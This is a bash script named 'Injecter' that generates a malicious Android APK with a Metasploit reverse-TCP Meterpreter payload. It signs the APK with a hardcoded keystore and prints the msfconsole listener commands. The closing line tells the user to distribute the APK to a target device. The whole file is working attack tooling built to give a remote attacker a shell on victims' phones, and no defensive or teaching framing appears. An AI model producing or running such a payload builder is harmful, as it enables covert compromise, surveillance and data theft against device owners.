#!/bin/bash
# Injecter - Android Payload Injection Tool
# Main payload creation script

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

display_banner() {
    clear
    echo -e "${RED}"
    echo ""
    echo "      ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗███████╗██████╗ "
    echo "      ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗"
    echo "      ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   █████╗  ██████╔╝"
    echo "      ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██╔══╝  ██╔══██╗"
    echo "      ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ███████╗██║  ██║"
    echo "      ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝"
    echo ""
    echo -e "${NC}"
    echo -e "${BLUE}Android Payload Genrater Tool${NC}"
    echo ""
}

show_message() {
    echo -e "${BLUE}[*]${NC} $1"
}

show_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

show_error() {
    echo -e "${RED}[-]${NC} $1"
}

validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -r i1 i2 i3 i4 <<< "$ip"
        if [[ $i1 -le 255 && $i2 -le 255 && $i3 -le 255 && $i4 -le 255 ]]; then
            return 0
        fi
    fi
    return 1
}

validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
        return 0
    fi
    return 1
}

check_dependencies() {
    local missing_deps=0
    
    if ! command -v msfvenom &> /dev/null; then
        show_error "msfvenom not found"
        missing_deps=1
    fi
    
    if ! command -v java &> /dev/null; then
        show_error "Java not found"
        missing_deps=1
    fi
    
    if ! command -v keytool &> /dev/null; then
        show_error "keytool not found"
        missing_deps=1
    fi
    
    if ! command -v jarsigner &> /dev/null; then
        show_error "jarsigner not found"
        missing_deps=1
    fi
    
    if [ $missing_deps -eq 1 ]; then
        echo ""
        show_message "Run ./setup.sh to install dependencies"
        exit 1
    fi
}

create_payload() {
    local lhost=$1
    local lport=$2
    
    show_message "Creating Android payload..."
    
    # Generate unique filename
    local timestamp=$(date +%s)
    local output_file="payload_${timestamp}.apk"
    
    # Create payload using msfvenom
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $output_file > /dev/null 2>&1
    
    if [ ! -f "$output_file" ]; then
        show_error "Failed to create payload with msfvenom"
        return 1
    fi
    
    show_message "Payload generated, signing APK..."
    
    # Create keystore if it doesn't exist
    if [ ! -f "injecter.keystore" ]; then
        keytool -genkey -v -keystore injecter.keystore \
            -alias injecter_key \
            -keyalg RSA -keysize 2048 \
            -validity 10000 \
            -storepass injecter123 \
            -keypass injecter123 \
            -dname "CN=Injecter" > /dev/null 2>&1
    fi
    
    # Sign the APK
    jarsigner -sigalg SHA1withRSA -digestalg SHA1 \
        -keystore injecter.keystore \
        -storepass injecter123 \
        -keypass injecter123 \
        $output_file injecter_key > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        show_success "Payload created: $output_file"
        echo $output_file
    else
        show_error "Failed to sign APK"
        rm -f $output_file
        return 1
    fi
}

show_listener() {
    local lhost=$1
    local lport=$2
    
    echo ""
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}  #########LISTENER CONFIGURATION#######          ${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${CYAN}Start Metasploit listener:${NC}"
    echo "msfconsole -q -x \"use exploit/multi/handler;"
    echo "set PAYLOAD android/meterpreter/reverse_tcp;"
    echo "set LHOST $lhost;"
    echo "set LPORT $lport;"
    echo "exploit\""
    echo ""
    echo -e "${CYAN}Or manually in msfconsole:${NC}"
    echo "use exploit/multi/handler"
    echo "set PAYLOAD android/meterpreter/reverse_tcp"
    echo "set LHOST $lhost"
    echo "set LPORT $lport"
    echo "exploit"
    echo ""
}

main() {
    display_banner
    
    # Check dependencies first
    show_message "Checking dependencies..."
    check_dependencies
    show_success "All dependencies found"
    
    echo ""
    echo -e "${CYAN}Payload Configuration${NC}"
    echo ""
    
    # Get LHOST
    while true; do
        echo -e -n "${BLUE}[?]${NC} Enter your LHOST (Your IP address): "
        read LHOST
        
        if validate_ip "$LHOST"; then
            break
        else
            show_error "Invalid IP address format. Example: 192.168.1.100"
        fi
    done
    
    echo ""
    
    # Get LPORT
    while true; do
        echo -e -n "${BLUE}[?]${NC} Enter LPORT [4444]: "
        read LPORT
        LPORT=${LPORT:-4444}
        
        if validate_port "$LPORT"; then
            break
        else
            show_error "Invalid port. Must be between 1 and 65535"
        fi
    done
    
    echo ""
    
    # Create payload
    PAYLOAD_FILE=$(create_payload "$LHOST" "$LPORT")
    
    if [ ! -z "$PAYLOAD_FILE" ] && [ -f "$PAYLOAD_FILE" ]; then
        echo ""
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${WHITE}          PAYLOAD CREATED SUCCESSFULLY          ${NC}"
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo ""
        echo -e "${CYAN}Payload Details:${NC}"
        echo -e "  ${WHITE}File:${NC} $PAYLOAD_FILE"
        echo -e "  ${WHITE}Size:${NC} $(du -h $PAYLOAD_FILE | cut -f1)"
        echo -e "  ${WHITE}LHOST:${NC} $LHOST"
        echo -e "  ${WHITE}LPORT:${NC} $LPORT"
        echo ""
        
        # Show listener configuration
        show_listener "$LHOST" "$LPORT"
        
        echo -e "${YELLOW}Note:${NC} Distribute the APK to target device and start listener"
        echo ""
    else
        show_error "Failed to create payload. Exiting."
        exit 1
    fi
}

# Start the main function
main